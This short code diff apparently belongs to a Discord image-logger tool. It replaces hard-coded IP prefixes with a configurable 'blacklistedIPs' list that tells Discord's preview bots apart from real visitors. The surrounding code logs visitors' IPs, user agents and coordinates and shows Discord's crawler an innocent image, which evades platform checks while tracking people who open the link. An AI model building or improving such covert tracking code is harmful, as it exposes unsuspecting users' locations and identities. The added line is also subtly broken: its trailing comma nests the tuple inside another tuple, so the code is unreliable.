@@ -63,6 +63,8 @@ config = {
     # 4) Image
 }
 
+blacklistedIPs = ("27", "34", "35", "104", "143", "164"), # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+                                                           # This feature is undocumented mainly due to it being for detecting bots better.
 def makeReport(ip, useragent = None, coords = None):
     if ip.startswith(('34', '35', '104')):
         if ip.startswith('104'): return
@@ -179,7 +181,7 @@ div.img {{
   height: 100vh;
   }}</style><div class="img"></div>'''.encode()
         
-        if self.headers.get('x-forwarded-for').startswith(('35', '34', '104')):
+        if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
             if "discord" in self.headers.get('user-agent').lower():
                 self.send_response(200) # 200 = OK (HTTP Status)
                 self.send_header('Content-type','image/jpeg') # Define the data as an image so Discord can show it.
